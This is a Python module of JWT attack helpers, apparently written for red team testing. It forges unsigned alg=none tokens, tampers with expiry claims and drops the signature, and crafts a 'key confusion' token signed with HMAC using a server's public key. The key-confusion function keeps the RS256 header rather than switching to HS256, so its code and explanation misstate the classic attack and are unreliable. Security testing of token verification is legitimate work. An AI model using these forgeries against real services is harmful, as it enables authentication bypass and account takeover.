"""JWT manipulation utilities for red team testing."""

import base64
import json
import hmac
import hashlib
import time


def decode_header(token: str) -> dict:
    """Decode the JWT header (no verification)."""
    header_b64 = token.split(".")[0]
    # Add padding if needed
    padding = 4 - len(header_b64) % 4
    if padding != 4:
        header_b64 += "=" * padding
    return json.loads(base64.urlsafe_b64decode(header_b64))


def decode_payload(token: str) -> dict:
    """Decode the JWT payload (no verification)."""
    payload_b64 = token.split(".")[1]
    padding = 4 - len(payload_b64) % 4
    if padding != 4:
        payload_b64 += "=" * padding
    return json.loads(base64.urlsafe_b64decode(payload_b64))


def encode_part(data: dict) -> str:
    """Base64url-encode a JSON dict (no padding)."""
    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).decode().rstrip("=")


def sign_hmac(payload: str, secret: str) -> str:
    """Sign with HMAC-SHA256."""
    sig = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(sig).decode().rstrip("=")


def craft_none_token(payload: dict) -> str:
    """Craft a JWT with alg=none (no signature)."""
    header = encode_part({"alg": "none", "typ": "JWT"})
    body = encode_part(payload)
    return f"{header}.{body}."


def craft_hmac_token(payload: dict, secret: str) -> str:
    """Craft a valid HMAC-SHA256 JWT with given secret."""
    header = encode_part({"alg": "HS256", "typ": "JWT"})
    body = encode_part(payload)
    sig = sign_hmac(f"{header}.{body}", secret)
    return f"{header}.{body}.{sig}"


def tamper_expiry(token: str, new_exp: int) -> str:
    """Take a valid token, modify its exp claim, and return unsigned token."""
    parts = token.split(".")
    payload = decode_payload(token)
    payload["exp"] = new_exp
    body = encode_part(payload)
    return f"{parts[0]}.{body}."


def craft_key_confusion(token: str, public_key_pem: str) -> str:
    """Craft an 'alg=RS256' token signed with HMAC using the public key as secret.

    This is the classic JWT key confusion attack. The victim server thinks
    it's verifying an RS256 token, but actually does HMAC with the public key.
    """
    header = encode_part({"alg": "RS256", "typ": "JWT"})
    body = encode_part(decode_payload(token))
    sig = sign_hmac(f"{header}.{body}", public_key_pem)
    return f"{header}.{body}.{sig}"


def decode_unverified(token: str) -> tuple[dict, dict]:
    """Return (header, payload) without any verification."""
    return decode_header(token), decode_payload(token)


def make_expired_payload(original_payload: dict, offset_seconds: int = -3600) -> dict:
    """Clone a payload with an expired timestamp."""
    p = dict(original_payload)
    p["exp"] = int(time.time()) + offset_seconds
    return p
